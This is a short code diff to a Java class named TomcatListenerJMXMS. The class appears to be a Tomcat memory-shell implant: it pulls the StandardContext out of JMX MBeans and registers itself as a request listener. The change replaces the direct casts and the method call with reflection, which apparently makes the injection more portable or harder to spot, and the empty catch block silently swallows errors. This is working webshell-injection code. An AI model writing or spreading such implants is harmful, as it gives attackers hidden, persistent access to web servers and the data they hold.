@@ -35,10 +35,10 @@ public class TomcatListenerJMXMS implements ServletRequestListener {
             }
             for (NamedObject namedObject : objectSet) {
                 javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
-                org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
-                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");
+                Object authenticatorBase = getFieldValue(dynamicMBean, "resource");
+                Object standardContext =  getFieldValue(authenticatorBase, "context");
                 TomcatListenerJMXMS listenerMemShell = new TomcatListenerJMXMS();
-                standardContext.addApplicationEventListener(listenerMemShell);
+                standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
             }
         } catch (Exception e) {
         }
